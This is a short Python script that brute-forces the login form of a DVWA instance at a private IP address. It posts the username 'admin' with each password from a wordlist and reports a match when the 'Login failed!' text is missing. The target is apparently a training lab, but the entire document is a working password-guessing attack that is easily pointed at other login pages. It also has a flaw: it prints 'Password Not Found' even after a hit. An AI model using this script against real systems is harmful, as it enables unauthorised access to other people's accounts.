import requests

target_url = 'http://192.168.1.8/dvwa/login.php'
data = {'username': 'admin', 'password': 'admin', 'Login': 'Login'}

with open('passwords.txt', 'r') as passwords:
    try:
        for password in passwords:
            data['password'] = password.strip()
            response = requests.post(target_url, data=data)
            if response.text.find('Login failed!') == -1:
                print('[+] Password Found: ' + password)
                break
        print('[-] Password Not Found')

    except Exception as e:
        print(e)
